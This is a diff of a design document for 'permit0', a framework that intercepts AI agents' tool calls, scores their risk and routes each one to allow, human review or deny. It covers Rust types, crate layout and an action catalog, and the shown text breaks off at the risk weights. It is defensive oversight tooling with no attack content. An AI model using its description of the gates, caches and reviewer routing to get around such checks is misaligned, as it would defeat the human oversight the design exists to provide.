@@ -4,18 +4,21 @@
 
 1. [Introduction](#1-introduction)
 2. [System Architecture](#2-system-architecture)
-3. [Data Structures](#3-data-structures)
+3. [Core Types](#3-core-types)
 4. [Action Catalog](#4-action-catalog)
 5. [Risk Scoring Pipeline](#5-risk-scoring-pipeline)
-6. [Action Registry](#6-action-registry)
-7. [Worked Example](#7-worked-example)
-8. [Permission Decision Mapping](#8-permission-decision-mapping)
-9. [Capability Token](#9-capability-token)
-10. [Learning System](#10-learning-system)
-11. [Calibration Guide](#11-calibration-guide)
+6. [Normalizer Packs](#6-normalizer-packs)
+7. [Risk Rules](#7-risk-rules)
+8. [Calibration System](#8-calibration-system)
+9. [Worked Example](#9-worked-example)
+10. [Permission Decision Mapping](#10-permission-decision-mapping)
+11. [Capability Token](#11-capability-token)
 12. [Session-Aware Scoring](#12-session-aware-scoring)
-13. [Developing](#13-developing)
-14. [Agent-in-the-Loop](#14-agent-in-the-loop)
+13. [Agent-in-the-Loop](#13-agent-in-the-loop)
+14. [Learning System](#14-learning-system)
+15. [Audit & Compliance](#15-audit--compliance)
+16. [Developing](#16-developing)
+17. [Phased Implementation Plan](#17-phased-implementation-plan)
 
 ---
 
@@ -25,7 +28,7 @@
 
 permit0 is a deterministic, fine-grained permission framework for AI agents.
 It intercepts every tool call an agent makes, evaluates its risk, and returns
-one of four decisions: **Allow**, **Agent-in-the-loop**, **Human-in-the-loop**, or **Deny**.
+one of three decisions: **Allow**, **Human-in-the-loop**, or **Deny**.
 
 ### Motivation
 
@@ -41,30 +44,42 @@ permit0 solves this with a **deterministic, rule-based risk pipeline** that conv
 
 - Every tool call is assessed against a **structured risk score**, not a natural language policy.
 - Risk is computed from **two sources**: static flag weights (what kind of action is this?) and contextual amplifiers (how bad is this instance?).
-- Adding a new action type requires **one class** — nothing else changes.
+- Adding a new integration requires **one YAML pack** — nothing else changes.
 - All decisions are **logged and cacheable**. Human approvals become training data that improves future automation.
 - The system is **composable**: a custom allowlist always wins; cached decisions are reused; the risk engine is the fallback.
+- The core is **Rust** for determinism, memory safety, and compliance attestation. Python and TypeScript bindings allow polyglot host applications.
+- Risk rules and normalizers are defined in a **YAML DSL** so contributors can add integrations without writing Rust.
+- Calibration is a **three-layer system** (base engine → domain profile → org policy) with guardrails that prevent unsafe configuration.
 
 ### Non-Goals
 
 - permit0 does not generate natural language policies.
 - It does not make final allow/block decisions autonomously — it produces a tier; the host system decides what to do with it.
 - Risk scores are calibrated heuristics, not probabilities. Do not interpret `score=72` as "72% chance of harm".
+- permit0 does not call vendor APIs. It inspects the *shape* of tool calls the agent makes. The agent (or host) holds the SDK; permit0 evaluates the request.
 
 ### Glossary
 
-| Term              | Meaning                                                           |
-|-------------------|-------------------------------------------------------------------|
-| Raw action        | The verbatim tool call payload from the agent                     |
-| Normalized action | Structured representation: action_type, verb, channel, entities   |
-| Risk template     | Mutable intermediate: flags + amplifiers, before scoring          |
-| Risk flag         | Categorical risk label (e.g. OUTBOUND, DESTRUCTION)               |
-| Amplifier         | Continuous dimension that scales risk (e.g. sensitivity)          |
-| RiskScore         | Output: raw float, display int, tier enum, flags, reason          |
-| Tier              | One of five bands: MINIMAL LOW MEDIUM HIGH CRITICAL               |
-| Permission        | One of four decisions: Allow / Agent-loop / Human-loop / Deny     |
-| Hard block        | A gate() call that forces CRITICAL regardless of score            |
-| Split             | A child assessment scored independently; score = max(self, child) |
+| Term | Meaning |
+|---|---|
+| Raw action | The verbatim tool call payload from the agent |
+| Normalized action (NormAction) | Structured representation: action_type, verb, channel, entities |
+| Pack | A YAML bundle containing normalizers + risk rules for one vendor/integration |
+| Normalizer | A declarative rule that matches a raw tool call and maps it to a NormAction |
+| Risk rule | A declarative YAML definition of base flags/amplifiers and entity-driven mutations |
+| Risk template | Mutable intermediate: flags + amplifiers, before scoring |
+| Risk flag | Categorical risk label (e.g. OUTBOUND, DESTRUCTION) |
+| Amplifier | Continuous dimension that scales risk (e.g. sensitivity) |
+| RiskScore | Output: raw float, display int, tier enum, flags, reason |
+| Tier | One of five bands: MINIMAL LOW MEDIUM HIGH CRITICAL |
+| Permission | One of three decisions: Allow / Human-loop / Deny |
+| Hard block | A gate rule that forces CRITICAL regardless of score |
+| Split | A child assessment scored independently; score = max(self, child) |
+| Domain profile | A curated calibration preset for an industry (fintech, healthtech) |
+| Org policy | Per-customer calibration overrides within guardrail bounds |
+| Guardrails | Compiled limits that prevent calibration from creating unsafe configurations |
+| Capability token | A Biscuit-based bearer token issued on Allow, verifiable offline |
+| norm_hash | SHA-256 hash of the canonical NormAction; key for caching and lists |
 
 ---
 
@@ -76,7 +91,7 @@ permit0 solves this with a **deterministic, rule-based risk pipeline** that conv
 flowchart TD
     A["Agent"] -->|tool_call| NRM
 
-    NRM["1. normalize_action<br/>domain.verb + entities + channel"]
+    NRM["1. normalize_action<br/>NormalizerRegistry picks matching YAML pack"]
     NRM --> DL
 
     DL{"2. Denylist?<br/>norm_hash match"}
@@ -88,15 +103,15 @@ flowchart TD
     AL -->|no| CP
 
     CP{"4. Default policy?<br/>cached norm_hash"}
-    CP -->|hit| CA["Return cached decision<br/>Allow or Human or Deny"]
+    CP -->|hit| CA["Return cached decision"]
     CP -->|miss| REG
 
-    REG{"5. Known action type?<br/>ACTION_REGISTRY"}
-    REG -->|unknown| BOOT["Bootstrap new rules<br/>LLM + human review"]
+    REG{"5. Known action type?<br/>Risk rule exists"}
+    REG -->|unknown| BOOT["Bootstrap new rules<br/>human review required"]
     REG -->|known| B1
 
     subgraph SG1["6. Risk scoring pipeline"]
-        B1["base template"] --> B2["mutate entities"]
+        B1["base template<br/>from YAML risk rule"] --> B2["apply mutation rules<br/>entity-driven YAML rules"]
         B2 --> B3["compute_hybrid<br/>6-step scorer"]
     end
 
@@ -122,186 +137,6 @@ flowchart TD
     style AGT fill:#185FA5,color:#E6F1FB
 ```
 
-```python
-from __future__ import annotations
-import hashlib, json
-from dataclasses import dataclass, field as dc_field
-from enum import IntEnum
-from typing import Callable
-
-
-# ── Permission enum ───────────────────────────────────────────────────────────
-# These are the three FINAL outcomes visible to the caller.
-# AGENT is an internal routing state, never returned externally.
-
-class Permission(str):
-    ALLOW  = "allow"               # execute, issue capability token
-    HUMAN  = "human_in_the_loop"   # surface to human operator
-    DENY   = "deny"                # block unconditionally
-
-# Internal routing only — never returned from get_permission()
-class _Routing(str):
-    AGENT = "agent_review"         # route to agent reviewer pipeline
-
-
-# ── Lists and policy cache ────────────────────────────────────────────────────
-# All three are keyed on norm_hash (normalized action hash), not raw tool_call_hash.
-# This makes them tool-agnostic: the same policy applies whether the action
-# arrives via bash, API, or any other surface.
-
-_denylist:        dict[str, str] = {}   # norm_hash → reason string
-_allowlist:       dict[str, str] = {}   # norm_hash → permission string (always ALLOW)
-_policy_cache:    dict[str, str] = {}   # norm_hash → cached permission decision
-
-
-def _hash(obj) -> str:
-    return hashlib.sha256(json.dumps(obj, sort_keys=True).encode()).hexdigest()[:16]
-
-
-def get_permission(
-    tool_call:  dict,
-    db,
-    org_domain: str = "",
-    task_goal:  str = "",
-    session:    "SessionContext | None" = None,
-) -> str:
-    """
-    Main entry point. Returns one of: allow | human_in_the_loop | deny.
-
-    Pipeline order:
-      1. normalize_action      -- always first; everything downstream is tool-agnostic
-      2. denylist check        -- hard block, no further evaluation
-      3. allowlist check       -- hard allow, no scoring needed
-      4. default policy cache  -- stored decision for this norm_action pattern
-      5. ACTION_REGISTRY check -- bootstrap if action type is unknown
-      6. risk scoring          -- base → mutate → compute_hybrid
-      7. score_to_routing      -- ALLOW | HUMAN | DENY | _AGENT
-      8. agent reviewer        -- only for MEDIUM; resolves to ALLOW | HUMAN | DENY
-    """
-    # ── Step 1: Normalize ─────────────────────────────────────────────────────
-    # Always happens first. Lists and cache operate on norm_hash, not raw
-    # tool_call_hash, so the same policy applies across all execution surfaces.
-    norm      = normalize_action(tool_call, org_domain=org_domain)
-    norm_hash = _hash(norm)
-    action_type = norm.get("action_type", "unknown.unclassified")
-
-    # ── Step 2: Denylist ──────────────────────────────────────────────────────
-    # Checked before allowlist — deny always wins.
-    if norm_hash in _denylist:
-        reason = _denylist[norm_hash]
-        db.log(tool_call, Permission.DENY, norm=norm, source="denylist",
-               block_reason=reason)
-        return Permission.DENY
-
-    # ── Step 3: Allowlist ─────────────────────────────────────────────────────
-    if norm_hash in _allowlist:
-        db.log(tool_call, Permission.ALLOW, norm=norm, source="allowlist")
-        return Permission.ALLOW
-
-    # ── Step 4: Default policy cache ─────────────────────────────────────────
-    # A cached decision represents a previously computed (or human-set) policy
-    # for this normalized action pattern. Hit = skip scoring entirely.
-    if norm_hash in _policy_cache:
-        decision = _policy_cache[norm_hash]
-        db.log(tool_call, decision, norm=norm, source="policy_cache")
-        return decision
-
-    # ── Step 5: Unknown action type → bootstrap ───────────────────────────────
-    if action_type not in ACTION_REGISTRY:
-        decision = create_new_rules(tool_call, norm, db)
-        return decision
-
-    # ── Step 6: Risk scoring ──────────────────────────────────────────────────
-    entities = {**norm.get("entities", {})}
-    entities["org_domain"]  = org_domain
-    entities["environment"] = entities.get("environment", "production")
-    if session:
-        entities["_session"]    = session
-    if task_goal:
-        entities["_task_goal"]  = task_goal
-
-    risk_score = assess(action_type, entities, session=session)
-
-    # ── Step 7: Map score → routing ───────────────────────────────────────────
-    routing = score_to_routing(risk_score.tier, risk_score.blocked)
-
-    # ── Step 8: Agent reviewer (MEDIUM only) ──────────────────────────────────
-    if routing == _Routing.AGENT:
-        decision, token = handle_medium(
-            tool_call=tool_call,
-            norm_action=norm,
-            risk_score=risk_score,
-            task_goal=task_goal,
-            session=session,
-            db=db,
-        )
-        _policy_cache[norm_hash] = decision
-        return decision
-
-    # ── Steps 7 direct: ALLOW, HUMAN, DENY ───────────────────────────────────
-    decision = routing
-    db.log(tool_call, decision, norm=norm, risk_score=risk_score, source="scorer")
-    _policy_cache[norm_hash] = decision
-    return decision
-
-
-def score_to_routing(tier: "Tier", blocked: bool = False) -> str:
-    """
-    Map a scorer tier to a routing decision.
-    Returns one of: Permission.ALLOW | Permission.HUMAN | Permission.DENY
-                    | _Routing.AGENT (internal -- triggers agent reviewer)
-    """
-    if blocked or tier == Tier.CRITICAL:
-        return Permission.DENY
-    if tier == Tier.HIGH:
-        return Permission.HUMAN
-    if tier == Tier.MEDIUM:
-        return _Routing.AGENT       # internal routing, not a final permission
-    return Permission.ALLOW         # MINIMAL or LOW
-
-
-def tier_to_permission(tier: "Tier", blocked: bool = False) -> str:
-    """Convenience alias -- returns a final Permission, never _Routing.AGENT."""
-    r = score_to_routing(tier, blocked)
-    return Permission.HUMAN if r == _Routing.AGENT else r
-
-
-def create_new_rules(tool_call: dict, norm: dict, db) -> str:
-    """
-    Bootstrap rules for a completely unknown tool.
-    Every LLM output is gated by human review before persisting.
-    """
-    # Steps 1–2: normalize (already done) → human review
-    reviewed_norm = db.human_review("norm_action", norm)
-    db.save("norm_action", reviewed_norm)
-
-    # Step 3: LLM generates risk rules → human review
-    risk_rules = llm_generate_risk_rules(reviewed_norm)
-    reviewed_rules = db.human_review("risk_rules", risk_rules)
-    db.save("risk_rules", reviewed_rules)
-
-    # Step 4: score → human review
-    risk_score = score_from_rules(reviewed_rules, reviewed_norm)
-    reviewed_score = db.human_review("risk_score", risk_score)
-
-    # Step 5: derive permission → human review
-    permission = tier_to_permission(reviewed_score.tier, reviewed_score.blocked)
-    final_permission = db.human_review("permission", permission)
-    db.save("permission", final_permission)
-
-    return final_permission
-
-
-def llm_generate_risk_rules(norm: dict) -> dict:
-    """Stub — replace with real LLM call."""
-    return {}
-
-
-def score_from_rules(rules: dict, norm: dict) -> "RiskScore":
-    """Stub — replace with rule-based scorer once rules are reviewed."""
-    return to_risk_score(0.5, [], "bootstrapped from LLM rules")
-```
-
 ### Permission Decisions
 
 Three final permissions, one internal routing state, two pre-scoring overrides.
@@ -317,200 +152,296 @@ Three final permissions, one internal routing state, two pre-scoring overrides.
 | **Human** | Agent reviewer | Uncertain, plausible, or confidence < 0.90 |
 | **Deny** | Agent reviewer | Clearly wrong, confidence >= 0.90, grounded reason |
 
-The agent reviewer **never produces Allow** and **never issues tokens**. It is a skeptical gate: Human or Deny only. Allow comes from the scorer (MINIMAL/LOW) or from human review. `_Routing.AGENT` triggers `handle_medium()` which resolves to Human or Deny.
+The agent reviewer **never produces Allow** and **never issues tokens**. It is a skeptical gate: Human or Deny only. Allow comes from the scorer (MINIMAL/LOW) or from human review.
+
+### Crate Layout
+
+```
+permit0-core/
+├── Cargo.toml                       # workspace
+├── crates/
+│   ├── permit0-types/               # Tier, RiskScore, NormAction, Permission, RiskTemplate
+│   │                                #   no_std-friendly, serde, zero deps, no I/O
+│   ├── permit0-scoring/             # weights, amplifiers, block rules, compute_hybrid,
+│   │                                #   ScoringConfig, guardrails, three-layer composition
+│   ├── permit0-normalize/           # Normalizer trait, NormalizerRegistry, dispatch
+│   │                                #   knows nothing about specific vendors
+│   ├── permit0-registry/            # ActionHandler trait, ACTION_REGISTRY, assess()
+│   │                                #   knows nothing about raw tool calls
+│   ├── permit0-dsl/                 # YAML DSL runtime: parser, IR, interpreter,
+│   │                                #   closed helper registry, static checker, loader
+│   │                                #   handles both normalizer YAML and risk rule YAML
+│   ├── permit0-token/               # biscuit-auth wrapper: mint, attenuate, verify
+│   ├── permit0-store/               # trait Store + sqlite impl; audit sink trait;
+│   │                                #   denylist, allowlist, policy cache, audit log
+│   ├── permit0-session/             # SessionContext, ActionRecord, session block rules,
+│   │                                #   session amplifier derivation
+│   ├── permit0-engine/              # get_permission() orchestrator; Engine + EngineBuilder
+│   │                                #   depends on all above; single public entry point
+│   ├── permit0-agent/               # MEDIUM reviewer: trait LlmClient, handle_medium()
+│   │                                #   (ollama/openai/mock impls behind cargo features)
+│   ├── permit0-cli/                 # permit0 check|calibrate|audit|pack CLI
+│   ├── permit0-py/                  # PyO3 bindings → wheel (maturin)
+│   └── permit0-node/                # napi-rs bindings → npm package
+├── packs/                           # first-party Rust-native packs (the trusted base)
+│   ├── permit0-pack-bash/           # generic shell fallback + unknown
+│   ├── permit0-pack-gmail/          # email.* via gmail
+│   ├── permit0-pack-slack/          # messages.* via slack
+│   ├── permit0-pack-stripe/         # payments.* via stripe
+│   ├── permit0-pack-github/         # dev.* via github
+│   ├── permit0-pack-fs/             # files.* for local filesystem
+│   └── permit0-pack-http/           # network.http_* generic
+├── pack-bundles/                    # DSL-authored community packs (YAML only)
+│   ├── notion/
+│   ├── linear/
+│   └── sendgrid/
+├── profiles/                        # domain calibration profiles
+│   ├── fintech.profile.yaml
+│   ├── healthtech.profile.yaml
+│   └── general.profile.yaml
+├── corpora/
+│   └── calibration/                 # golden test cases (JSON), shared by all langs
+├── bindings/
+│   ├── python/                      # pure-python ergonomics layer over permit0-py
+│   └── typescript/                  # TS types + ergonomic layer over permit0-node
+└── docs/
+    ├── permit.md                    # this document
+    └── dsl.md                       # full DSL specification
+```
+
+### Language Strategy
+
+| Layer | Language | Responsibility |
+|---|---|---|
+| Core engine | Rust | Risk scoring, token issuance/verification, session state, crypto, DSL interpreter |
+| Packs & config | YAML DSL | Normalizer definitions, risk rule definitions, calibration profiles, org policies |
+| Python bindings | Rust (PyO3) | In-process access to the engine from Python host apps |
+| TypeScript bindings | Rust (napi-rs) | In-process access to the engine from Node.js/TS host apps |
+| CLI | Rust | `permit0 check`, `permit0 calibrate`, `permit0 audit`, `permit0 pack` |
+
+The core is Rust for three reasons: the scoring pipeline runs on every tool call in the hot path (latency matters), the token crypto must be correct by construction (safety matters), and compliance attestation requires a reviewable, deterministic codebase with a clean supply chain.
+
+Python and TypeScript never touch cryptographic primitives or scoring math — they call into the Rust core via FFI. The YAML DSL is the authoring surface for rules and normalizers; the Rust DSL interpreter executes them deterministically.
 
 ---
 
-## 3. Data Structures
+## 3. Core Types
 
 ### Output Types
 
-```python
-class Tier(IntEnum):
-    MINIMAL  = 0   # raw < 0.15  → Allow (direct)
-    LOW      = 1   # raw < 0.35  → Allow (direct)
-    MEDIUM   = 2   # raw < 0.55  → Agent reviewer → Human | Deny only
-    HIGH     = 3   # raw < 0.75  → Human-in-the-loop (direct)
-    CRITICAL = 4   # raw >= 0.75 → Deny (direct)
+```rust
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
+pub enum Tier {
+    Minimal  = 0,   // raw < 0.15  → Allow (direct)
+    Low      = 1,   // raw < 0.35  → Allow (direct)
+    Medium   = 2,   // raw < 0.55  → Agent reviewer → Human | Deny only
+    High     = 3,   // raw < 0.75  → Human-in-the-loop (direct)
+    Critical = 4,   // raw >= 0.75 → Deny (direct)
+}
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct RiskScore {
+    pub raw:          f64,          // 0.0–1.0  — use for math / composition
+    pub score:        u32,          // 0–100    — use for display
+    pub tier:         Tier,
+    pub flags:        Vec<String>,  // which risk flags fired
+    pub reason:       String,       // human-readable explanation
+    pub blocked:      bool,
+    pub block_reason: Option<String>,
+}
 
-@dataclass
-class RiskScore:
-    raw:          float        # 0.0–1.0  — use for math / composition
-    score:        int          # 0–100    — use for display
-    tier:         Tier         #          — use for policy gates
-    flags:        list[str]    # which risk flags fired
-    reason:       str          # human-readable explanation
-    blocked:      bool       = False
-    block_reason: str | None = None
+pub const TIER_THRESHOLDS: &[(f64, Tier)] = &[
+    (0.15, Tier::Minimal),
+    (0.35, Tier::Low),
+    (0.55, Tier::Medium),
+    (0.75, Tier::High),
+    (1.00, Tier::Critical),
+];
 
-
-TIER_THRESHOLDS: list[tuple[float, Tier]] = [
-    (0.15, Tier.MINIMAL),
-    (0.35, Tier.LOW),
-    (0.55, Tier.MEDIUM),
-    (0.75, Tier.HIGH),
-    (1.00, Tier.CRITICAL),
-]
-
-
-def to_risk_score(
-    raw: float,
-    flags: list[str],
-    reason: str = "",
-    *,
-    blocked: bool = False,
-    block_reason: str | None = None,
-) -> RiskScore:
-    raw   = max(0.0, min(1.0, raw))
-    score = int(round(raw * 100))
-    tier  = next(t for ceiling, t in TIER_THRESHOLDS if raw <= ceiling)
-    if blocked:
-        tier  = Tier.CRITICAL
-        score = 100
-        raw   = 1.0
-    return RiskScore(
-        raw=round(raw, 4), score=score, tier=tier,
-        flags=flags, reason=reason,
-        blocked=blocked, block_reason=block_reason,
-    )
+pub fn to_risk_score(
+    raw: f64,
+    flags: Vec<String>,
+    reason: &str,
+    blocked: bool,
+    block_reason: Option<String>,
+) -> RiskScore {
+    let raw = raw.clamp(0.0, 1.0);
+    let score = (raw * 100.0).round() as u32;
+    let tier = if blocked {
+        Tier::Critical
+    } else {
+        TIER_THRESHOLDS.iter()
+            .find(|(ceiling, _)| raw <= *ceiling)
+            .map(|(_, t)| *t)
+            .unwrap_or(Tier::Critical)
+    };
+    RiskScore {
+        raw: (raw * 10000.0).round() / 10000.0,
+        score,
+        tier,
+        flags,
+        reason: reason.to_string(),
+        blocked,
+        block_reason,
+    }
+}
 ```
 
 ### Normalized Action
 
-A structured, tool-agnostic representation of what the action *means*.
-This is the stable key used for risk rule lookup and caching.
+A structured, tool-agnostic representation of what the action *means*. This is the stable key used for risk rule lookup and caching.
 
-| Field | Type | Description |
-|---|---|---|
-| action_type | string | Canonical `domain.verb` identifier. Primary key for risk rules |
-| domain | string | Top-level action category (e.g. `email`, `files`, `payments`) |
-| verb | string | Core intent (e.g. `send`, `delete`, `read`) |
-| channel | string | Provider / integration (e.g. `gmail`, `slack`, `stripe`) |
-| entities | object | Semantic parameters: recipient, scope, payload, etc. |
-| execution | object | Surface tool and raw command (for audit) |
+```rust
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct NormAction {
+    pub action_type: String,        // "email.send" — primary key for risk rules
+    pub domain:      String,        // "email"
+    pub verb:        String,        // "send"
+    pub channel:     String,        // "gmail"
+    pub entities:    Entities,      // semantic parameters
+    pub execution:   ExecutionMeta, // surface tool and raw command (for audit)
+}
 
-```python
-import re
+/// Opaque entity map — pack-defined fields.
+pub type Entities = serde_json::Map<String, serde_json::Value>;
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ExecutionMeta {
+    pub surface_tool:    String,
+    pub surface_command: String,
+}
 
-def normalize_action(tool_call: dict, org_domain: str = "") -> dict:
-    """
-    Convert a raw tool call into a normalized action.
-    In production this is LLM-assisted + human-reviewed.
-    This implementation covers the bash/gmail pattern deterministically.
-    """
-    tool    = tool_call.get("tool", "")
-    args    = tool_call.get("arguments", {})
-    command = args.get("command", "")
+/// SHA-256 of the canonical JSON form, truncated to 16 hex chars for display.
+/// Internally stored as full 32 bytes.
+pub type NormHash = [u8; 32];
 
-    # ── gmail send via bash ───────────────────────────────────────────────────
-    if tool == "bash" and "gmail send" in command:
-        to      = _extract_flag(command, "--to")
-        subject = _extract_flag(command, "--subject")
-        body    = _extract_flag(command, "--body")
-        recip_scope = _recipient_scope(to, org_domain)
-        return {
-            "action_type": "email.send",
-            "domain":      "email",
-            "verb":        "send",
-            "channel":     "gmail",
-            "entities": {
-                "object":           "email",
-                "recipient":        to,
-                "recipient_scope":  recip_scope,
-                "subject":          subject,
-                "has_body":         bool(body),
-                "has_attachments":  False,
-                "body":             body,
-            },
-            "execution": {
-                "surface_tool":    tool,
-                "surface_command": command,
-            },
-        }
-
-    # ── generic bash fallback ─────────────────────────────────────────────────
-    if tool == "bash":
-        return {
-            "action_type": "process.shell",
-            "domain":      "process",
-            "verb":        "shell",
-            "channel":     "bash",
-            "entities":    {"command": command},
-            "execution":   {"surface_tool": tool, "surface_command": command},
-        }
-
-    # ── unknown ───────────────────────────────────────────────────────────────
-    return {
-        "action_type": "unknown.unclassified",
-        "domain":      "unknown",
-        "verb":        "unclassified",
-        "channel":     tool,
-        "entities":    args,
-        "execution":   {"surface_tool": tool, "surface_command": str(args)},
+impl NormAction {
+    pub fn norm_hash(&self) -> NormHash {
+        // Canonical JSON: sorted keys, no whitespace, UTF-8 NFC,
+        // null fields omitted, integers without leading zeros.
+        let canonical = canonical_json(self);
+        sha256(canonical.as_bytes())
     }
+}
+```
 
+### Permission and Routing
 
-def _extract_flag(command: str, flag: str) -> str:
-    m = re.search(rf'{re.escape(flag)}\s+"?([^"]+)"?', command)
-    return m.group(1).strip() if m else ""
+```rust
+/// Three final outcomes visible to callers.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+pub enum Permission {
+    Allow,
+    HumanInTheLoop,
+    Deny,
+}
 
+/// Internal routing — never returned from get_permission().
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum Routing {
+    Agent,  // triggers agent reviewer pipeline for MEDIUM tier
+}
 
-def _recipient_scope(recipient: str, org_domain: str) -> str:
-    if not recipient:
-        return "external"
-    domain = recipient.split("@")[-1].lower() if "@" in recipient else ""
-    if not domain:
-        return "external"
-    if org_domain and domain == org_domain.lower():
-        return "internal"
-    return "external"
+pub fn score_to_routing(tier: Tier, blocked: bool) -> Result<Permission, Routing> {
+    if blocked || tier == Tier::Critical {
+        return Ok(Permission::Deny);
+    }
+    match tier {
+        Tier::Minimal | Tier::Low => Ok(Permission::Allow),
+        Tier::Medium => Err(Routing::Agent),  // internal routing
+        Tier::High => Ok(Permission::HumanInTheLoop),
+        Tier::Critical => Ok(Permission::Deny),
+    }
+}
+```
+
+### Risk Template and Mutation API
+
+The `RiskTemplate` is the mutable intermediate representation that risk rules build up before scoring. It is constructed from YAML `base` definitions and modified by YAML `rules`.
+
+```rust
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct RiskTemplate {
+    pub flags:        HashMap<String, FlagRole>,  // flag → primary | secondary
+    pub amplifiers:   HashMap<String, i32>,       // dimension → raw integer value
+    pub blocked:      bool,
+    pub block_reason: Option<String>,
+    pub children:     Vec<RiskTemplate>,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+pub enum FlagRole {
+    Primary,
+    Secondary,
+}
+
+impl RiskTemplate {
+    // ── Mutation API ────────────────────────────────────────────────
+    // The ONLY way to modify a template. Mapped 1:1 from YAML rule actions.
+
+    pub fn add(&mut self, flag: &str, role: FlagRole)       // add flag if not present
+    pub fn remove(&mut self, flag: &str)                     // remove flag entirely
+    pub fn promote(&mut self, flag: &str)                    // secondary → primary
+    pub fn demote(&mut self, flag: &str)                     // primary → secondary
+    pub fn upgrade(&mut self, dim: &str, delta: i32)         // increase amplifier, capped
+    pub fn downgrade(&mut self, dim: &str, delta: i32)       // decrease amplifier, floored at 0
+    pub fn override_amp(&mut self, dim: &str, value: i32)    // set exact value, clamped
+    pub fn gate(&mut self, reason: &str)                     // hard block
+    pub fn split(&mut self, child: RiskTemplate)             // fork independent child
+}
 ```
 
 ---
 
 ## 4. Action Catalog
 
-Every action is identified by a `domain.verb` string.
-    
-| Domain   | Verbs                                                                                                                        |
-|----------|------------------------------------------------------------------------------------------------------------------------------|
-| email    | search, get_thread, send, reply, forward, draft, label, archive, delete                                                      |
-| messages | send, post_channel, send_dm, search, react, delete                                                                           |
-| content  | post_social, update_cms, send_newsletter                                                                                     |
-| calendar | list_events, get_event, create_event, update_event, delete_event, rsvp                                                       |
-| tasks    | create, assign, complete, update, delete, comment                                                                            |
-| files    | list, read, write, delete, move, copy, share, upload, download, export                                                       |
-| db       | select, insert, update, delete, admin, export, backup                                                                        |
-| crm      | search_contacts, get_contact, create_contact, update_contact, delete_contact, create_deal, update_deal, log_activity, export |
-| payments | charge, refund, transfer, get_balance, list_transactions, create_invoice, update_payment_method, create_subscription         |
-| legal    | sign_document, submit_filing, accept_terms                                                                                   |
-| iam      | list_users, create_user, update_user, delete_user, assign_role, revoke_role, reset_password, generate_api_key                |
-| secrets  | read, create, rotate                                                                                                         |
-| infra    | list_resources, create_resource, modify_resource, terminate_resource, scale, modify_network                                  |
-| process  | shell, run_script, docker_run, lambda_invoke                                                                                 |
-| network  | http_get, http_post, webhook_send                                                                                            |
-| dev      | get_repo, list_issues, create_issue, create_pr, merge_pr, push_code, deploy, run_pipeline, create_release                    |
-| browser  | navigate, click, fill_form, submit_form, screenshot, download, execute_js                                                    |
-| device   | unlock, lock, camera_enable, camera_disable, move                                                                            |
-| ai       | prompt, embed, fine_tune                                                                                                     |
-| unknown  | unclassified                                                                                                                 |
+Every action is identified by a `domain.verb` string. The catalog is **append-only** — entries can be added but never renamed or removed without a major version bump.
+
+| Domain | Verbs |
+|---|---|
+| email | search, get_thread, send, reply, forward, draft, label, archive, delete |
+| messages | send, post_channel, send_dm, search, react, delete |
+| content | post_social, update_cms, send_newsletter |
+| calendar | list_events, get_event, create_event, update_event, delete_event, rsvp |
+| tasks | create, assign, complete, update, delete, comment |
+| files | list, read, write, delete, move, copy, share, upload, download, export |
+| db | select, insert, update, delete, admin, export, backup |
+| crm | search_contacts, get_contact, create_contact, update_contact, delete_contact, create_deal, update_deal, log_activity, export |
+| payments | charge, refund, transfer, get_balance, list_transactions, create_invoice, update_payment_method, create_subscription |
+| legal | sign_document, submit_filing, accept_terms |
+| iam | list_users, create_user, update_user, delete_user, assign_role, revoke_role, reset_password, generate_api_key |
+| secrets | read, create, rotate |
+| infra | list_resources, create_resource, modify_resource, terminate_resource, scale, modify_network |
+| process | shell, run_script, docker_run, lambda_invoke |
+| network | http_get, http_post, webhook_send |
+| dev | get_repo, list_issues, create_issue, create_pr, merge_pr, push_code, deploy, run_pipeline, create_release |
+| browser | navigate, click, fill_form, submit_form, screenshot, download, execute_js |
+| device | unlock, lock, camera_enable, camera_disable, move |
+| ai | prompt, embed, fine_tune |
+| unknown | unclassified |
 
 ### Default Risk Tier by Verb
 
-| Verb pattern              | Default tier  | Rationale                             |
-|---------------------------|---------------|---------------------------------------|
-| list, search, get, read   | MINIMAL–LOW   | Read-only, no state change            |
-| create, draft, comment    | LOW–MEDIUM    | Additive, usually reversible          |
-| send, post, reply         | MEDIUM        | Outbound, irreversible once delivered |
-| update, edit, move, copy  | MEDIUM        | Mutation, scope-dependent             |
-| delete, archive, revoke   | MEDIUM–HIGH   | Destructive, often irreversible       |
-| forward, export, share    | HIGH          | Outbound + potential data leakage     |
-| deploy, run, exec, shell  | HIGH          | Execution risk                        |
-| charge, transfer, sign    | HIGH–CRITICAL | Financial or legal consequence        |
-| terminate, drop, purge    | CRITICAL      | Irreversible destruction              |
-| assign_role, generate_key | HIGH          | Privilege escalation                  |
+| Verb pattern | Default tier | Rationale |
+|---|---|---|
+| list, search, get, read | MINIMAL–LOW | Read-only, no state change |
+| create, draft, comment | LOW–MEDIUM | Additive, usually reversible |
+| send, post, reply | MEDIUM | Outbound, irreversible once delivered |
+| update, edit, move, copy | MEDIUM | Mutation, scope-dependent |
+| delete, archive, revoke | MEDIUM–HIGH | Destructive, often irreversible |
+| forward, export, share | HIGH | Outbound + potential data leakage |
+| deploy, run, exec, shell | HIGH | Execution risk |
+| charge, transfer, sign | HIGH–CRITICAL | Financial or legal consequence |
+| terminate, drop, purge | CRITICAL | Irreversible destruction |
+| assign_role, generate_key | HIGH | Privilege escalation |
+
+### Catalog Versioning
+
+- The catalog is published as `CATALOG.md` with a dated changelog alongside `CHANGELOG.md`.
+- New `domain.verb` entries can be added in any minor release.
+- Renames and splits require a major release and a multi-version migration path.
+- The meaning of an existing entry never changes — add a new entry instead.
+- The catalog is part of the compliance attestation surface.
 
 ---
 
@@ -518,209 +449,93 @@ Every action is identified by a `domain.verb` string.
 
 ### Risk Flags
 
-```python
-# Per-flag base weights (fractions of 1.0).
-# NOT a probability distribution — multiple flags can fire simultaneously.
-# Calibration question: "if only this flag fired with no amplifiers,
-# what fraction of maximum risk does it represent?"
-RISK_WEIGHTS: dict[str, float] = {
